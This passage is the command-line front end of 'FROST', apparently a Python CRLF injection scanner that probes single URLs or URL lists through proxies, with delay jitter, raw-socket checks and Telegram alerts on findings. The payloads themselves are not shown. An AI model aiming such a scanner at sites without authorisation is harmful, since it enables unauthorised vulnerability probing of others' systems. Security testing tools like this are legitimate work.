            elif line.strip():
                print(f"  {Fore.YELLOW}[WARN] Skipping invalid URL at line {line_num}: {line.strip()}{Style.RESET_ALL}")

    if not urls:
        print(f"{Fore.RED}[!] No valid URLs found in {filepath}{Style.RESET_ALL}")
        sys.exit(1)

    return urls


def parse_custom_headers(header_strings: list[str]) -> dict:
    headers = {}
    for h in header_strings:
        if ":" in h:
            key, value = h.split(":", 1)
            headers[key.strip()] = value.strip()
    return headers


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="frost",
        description="FROST — CRLF Injection Scanner",
        epilog="Example: python crlf_scanner.py -u https://example.com --telegram-token BOT_TOKEN --chatid CHAT_ID",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    target_group = parser.add_mutually_exclusive_group(required=True)
    target_group.add_argument(
        "-u", "--url",
        help="Single target URL to scan"
    )
    target_group.add_argument(
        "-l", "--list",
        dest="url_list",
        help="File containing URLs to scan (one per line)"
    )

    parser.add_argument(
        "-t", "--threads",
        type=int, default=10,
        help="Concurrency level / max simultaneous requests (default: 10)"
    )
    parser.add_argument(
        "-p", "--proxy",
        help="Proxy URL (e.g., http://127.0.0.1:8080 or socks5://127.0.0.1:1080)"
    )
    parser.add_argument(
        "-o", "--output",
        help="Output file path (use .json extension for JSON output)"
    )
    parser.add_argument(
        "--timeout",
        type=float, default=10.0,
        help="Request timeout in seconds (default: 10)"
    )
    parser.add_argument(
        "--delay",
        type=float, default=0.0,
        help="Base per-request delay in seconds, with random jitter up to the same amount (default: 0)"
    )
    parser.add_argument(
        "--follow-redirects",
        action="store_true", default=False,
        help="Follow HTTP redirects (default: disabled for accuracy)"
    )
    parser.add_argument(
        "--headers",
        nargs="*", default=[],
        help="Custom headers in 'Key:Value' format"
    )
    parser.add_argument(
        "--no-raw-verify",
        action="store_true", default=False,
        help="Disable raw socket verification (faster but less accurate)"
    )
    parser.add_argument(
        "--telegram-token",
        help="Telegram Bot API Token (or set env var CRLF_TELEGRAM_TOKEN)"
    )
    parser.add_argument(
        "-c", "--chatid", "--telegram-chatid",
        dest="telegram_chatid",
        help="Telegram Chat ID to receive vulnerability alerts (or set env var CRLF_TELEGRAM_CHATID)"
    )
    parser.add_argument(
        "-v", "--verbose",
        action="store_true", default=False,
        help="Show detailed output for every payload test"
    )
    parser.add_argument(
        "--json",
        action="store_true", default=False,
        help="Output results in JSON format to stdout"
    )
    parser.add_argument(
        "--version",
        action="version",
        version=f"FROST v{VERSION}"
    )

    return parser


async def main():
    parser = build_parser()
    args = parser.parse_args()

    real_stdout = sys.stdout
    if args.json:
        sys.stdout = sys.stderr

    print(BANNER)

    if args.url:
        url = validate_url(args.url)
        if not url:
            print(f"{Fore.RED}[!] Invalid URL: {args.url}{Style.RESET_ALL}")
            sys.exit(1)
        urls = [url]
    else:
        urls = load_urls_from_file(args.url_list)

    custom_headers = parse_custom_headers(args.headers) if args.headers else {}

    telegram_token = args.telegram_token or os.environ.get("CRLF_TELEGRAM_TOKEN")
    telegram_chatid = args.telegram_chatid or os.environ.get("CRLF_TELEGRAM_CHATID")

    print(f"  {Fore.LIGHTWHITE_EX}Configuration:{Style.RESET_ALL}")
    print(f"  {Fore.WHITE}├─ Targets       : {Fore.CYAN}{len(urls)} URL(s){Style.RESET_ALL}")
    print(f"  {Fore.WHITE}├─ Concurrency   : {Fore.CYAN}{args.threads}{Style.RESET_ALL}")
    print(f"  {Fore.WHITE}├─ Timeout       : {Fore.CYAN}{args.timeout}s{Style.RESET_ALL}")
    print(f"  {Fore.WHITE}├─ Proxy         : {Fore.CYAN}{args.proxy or 'None'}{Style.RESET_ALL}")
    print(f"  {Fore.WHITE}├─ Redirects     : {Fore.CYAN}{'Follow' if args.follow_redirects else 'Disabled'}{Style.RESET_ALL}")
    print(f"  {Fore.WHITE}├─ Delay         : {Fore.CYAN}{args.delay}s{Style.RESET_ALL}")
    print(f"  {Fore.WHITE}├─ Raw verify    : {Fore.CYAN}{'Disabled' if args.no_raw_verify else 'Enabled'}{Style.RESET_ALL}")
    tg_status = "Enabled" if (telegram_token and telegram_chatid) else ("Missing Chat ID or Token" if (telegram_token or telegram_chatid) else "Disabled")
    print(f"  {Fore.WHITE}├─ Telegram Bot  : {Fore.CYAN}{tg_status}{Style.RESET_ALL}")
    print(f"  {Fore.WHITE}└─ Payloads      : {Fore.CYAN}{len(generate_payloads())}{Style.RESET_ALL}")

    if args.no_raw_verify:
        print(f"  {Fore.YELLOW}[!] Raw socket verification is disabled — findings rely on the HTTP\n"
              f"      library alone, which may normalize headers and inflate/deflate confidence.{Style.RESET_ALL}")

    scanner = CRLFScanner(
        concurrency=args.threads,
        timeout=args.timeout,
        proxy=args.proxy,
        follow_redirects=args.follow_redirects,
        custom_headers=custom_headers,
        verbose=args.verbose,
        verify_with_raw_socket=not args.no_raw_verify,
        telegram_token=telegram_token,
        telegram_chatid=telegram_chatid,
        delay=args.delay,
    )

    results = await scanner.scan(urls)

    Reporter.print_summary(scanner.stats)

    if args.output:
        if args.output.endswith(".json"):
            Reporter.save_json(results, args.output)
        else:
            Reporter.save_text(results, args.output)

    if args.json:
        output_data = []
        for r in results:
            output_data.append({
                "target_url": r.target_url,
                "payload_url": r.payload_url,
                "injection_type": r.injection_type,
                "confidence": r.confidence.value,
                "confidence_score": r.confidence_score,
                "evidence": r.evidence,
            })
        print(json.dumps(output_data, indent=2), file=real_stdout)

    sys.exit(1 if results else 0)


if __name__ == "__main__":
    asyncio.run(main())
